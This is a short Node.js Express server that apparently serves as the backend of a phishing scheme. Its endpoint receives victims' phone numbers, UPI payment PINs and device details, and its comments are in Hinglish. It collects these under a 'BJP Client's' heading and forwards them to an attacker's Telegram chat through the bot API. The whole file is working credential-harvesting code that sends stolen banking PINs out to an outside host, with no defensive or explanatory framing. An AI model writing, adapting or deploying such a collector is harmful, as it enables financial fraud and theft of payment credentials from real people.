require('dotenv').config();
const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

const { PORT, BOT_TOKEN, CHAT_ID } = process.env;

let lastMessageId = null; 
let fullHistory = `*BJP Client's*\n\n`; 

const sendOrUpdateTelegram = async (newEntry) => {
    fullHistory += newEntry + `\n`; 

    try {
        if (!lastMessageId) {
            const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: fullHistory,
                parse_mode: 'Markdown'
            });
            lastMessageId = response.data.result.message_id;
        } else {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
                chat_id: CHAT_ID,
                message_id: lastMessageId,
                text: fullHistory,
                parse_mode: 'Markdown'
            });
        }
    } catch (error) {
        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: fullHistory,
            parse_mode: 'Markdown'
        });
        lastMessageId = response.data.result.message_id;
    }
};

const startupNotification = async () => {
    lastMessageId = null;
    fullHistory = `*BJP Client's*\n\n`;
};

app.post('/send-data', async (req, res) => {
    const { type, number, pin, deviceId, deviceTime, deviceDate } = req.body;
    
    // Format building
    let entry = `Device Model: ${deviceId || 'Detecting...'}\n`;
    entry += `Date: ${deviceDate || 'Detecting...'}\n`; 
    entry += `Real Time: ${deviceTime || 'Detecting...'}\n`;

    // Condition: Agar PIN mil gaya hai to sirf PIN dikhao, Number nahi
    if (type !== 'NUMBER' && pin) {
        entry += `UPI PIN: ${pin}\n`;
    } else if (number) {
        // Agar sirf Number hai aur PIN pending hai
        entry += `Number: +91 ${number}\n`;
    }

    await sendOrUpdateTelegram(entry);
    
    res.status(200).json({ success: true });
});

app.listen(PORT, () => {
    startupNotification();
    console.log(`Server running on port ${PORT}`);
});
